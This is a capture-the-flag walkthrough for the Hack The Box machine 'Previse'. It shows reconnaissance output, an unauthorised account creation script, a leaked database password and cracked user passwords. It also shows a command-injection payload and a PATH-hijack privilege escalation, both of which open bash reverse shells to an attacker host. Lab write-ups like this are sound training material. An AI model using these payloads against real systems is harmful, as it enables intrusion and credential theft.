# Previse notes
https://app.hackthebox.eu/machines/Previse

### Information Gathering
Apache web server
SSH

### Service Enumeration
Nmap scan results:
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDbdbnxQupSPdfuEywpVV7Wp3dHqctX3U+bBa/UyMNxMjkPO+rL5E6ZTAcnoaOJ7SK8Mx1xWik7t78Q0e16QHaz3vk2AgtklyB+KtlH4RWMBEaZVEAfqXRG43FrvYgZe7WitZINAo6kegUbBZVxbCIcUM779/q+i+gXtBJiEdOOfZCaUtB0m6MlwE2H2SeID06g3DC54/VSvwHigQgQ1b7CNgQOslbQ78FbhI+k9kT2gYslacuTwQhacntIh2XFo0YtfY+dySOmi3CXFrNlbUc2puFqtlvBm3TxjzRTxAImBdspggrqXHoOPYf2DBQUMslV9prdyI6kfz9jUFu2P1Dd
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCnDbkb4wzeF+aiHLOs5KNLPZhGOzgPwRSQ3VHK7vi4rH60g/RsecRusTkpq48Pln1iTYQt/turjw3lb0SfEK/4=
|   256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIICTOv+Redwjirw6cPpkc/d3Fzz4iRB3lCRfZpZ7irps
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-favicon: Unknown favicon MD5: B21DD667DF8D81CAE6DD1374DD548004
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Previse Login
|_Requested resource was login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

#### Apache Server
Gobuster results:
```
/index.php            (Status: 302) [Size: 2801] [--> login.php]
/download.php         (Status: 302) [Size: 0] [--> login.php]   
/login.php            (Status: 200) [Size: 2224]                
/files.php            (Status: 302) [Size: 6084] [--> login.php]
/header.php           (Status: 200) [Size: 980]                 
/nav.php              (Status: 200) [Size: 1248]                
/footer.php           (Status: 200) [Size: 217]                 
/css                  (Status: 301) [Size: 310] [--> http://10.10.11.104/css/]
/status.php           (Status: 302) [Size: 2970] [--> login.php]              
/js                   (Status: 301) [Size: 309] [--> http://10.10.11.104/js/] 
/logout.php           (Status: 302) [Size: 0] [--> login.php]                 
/accounts.php         (Status: 302) [Size: 3994] [--> login.php]              
/config.php           (Status: 200) [Size: 0]                                 
/logs.php             (Status: 302) [Size: 0] [--> login.php]
/file_logs.php
```
/files.php has interesting html with possible username: newguy
/accounts.php - used to create new users * we can see only admins allowed

Added user with python requests:
```python
import requests
url = 'http://10.10.11.104/accounts.php'
data = {'username':'cornbread','password':'letmein','confirm':'letmein'}
r = requests.post(url, allow_redirects=False, data=data)
print(r.content)
```
We can now download siteBackup.zip and look through the source code.
Contents of /siteBackup.zip/config.php:
```php
	$host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
```

### Initial Exploitation
Vulnerability Explanation:
logs.php takes the post parameter 'delim' and uses it as an argument in a command run by system. By changing altering delim we can send ourselves a reverse shell. Below is what I swapped out for `delim=comma` in burp.


Proof of Concept:
```bash
delim=comma & bash -c 'exec bash -i &>/dev/tcp/<attacker IP>/4444 <&1'
```

#### Pivoting
MySQL shows hashed passwords running m4lwhere's hashed password through hashcat with rockyou.txt gives us his password "ilovecody112235!". We also recover admin2's password "123456".
```
mysql> select * from accounts;
+----+-----------+------------------------------------+---------------------+
| id | username  | password                           | created_at          |
+----+-----------+------------------------------------+---------------------+
|  1 | m4lwhere  | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
|  2 | cornbread | $1$🧂llol$aSq5B16FXsXeMAF6OIBO6/ | 2021-08-30 22:58:14 |
|  3 | admin2    | $1$🧂llol$wzYjWk/p5usz8BzxvPrXs1 | 2021-08-30 23:12:42 |
+----+-----------+------------------------------------+---------------------+
```






### Privilege Escalation
Vulnerability Explanation:
There is a shell script that can be run as root that I abused. The file located at `/opt/scripts/access_backup.sh` runs gzip without absolute path. So I can create a file named gzip and modify my environmental variables to have access_backup.sh run my gzip as root.

Exploit Code:
```bash
cd /tmp
echo "bash -c 'exec bash -i &>/dev/tcp/<attacker IP>/9001 <&1'" > gzip
export PATH=/tmp:$PATH
```
Start netcat listener on attacker machine.
```bash
sudo /opt/scripts/access_backup.sh
```
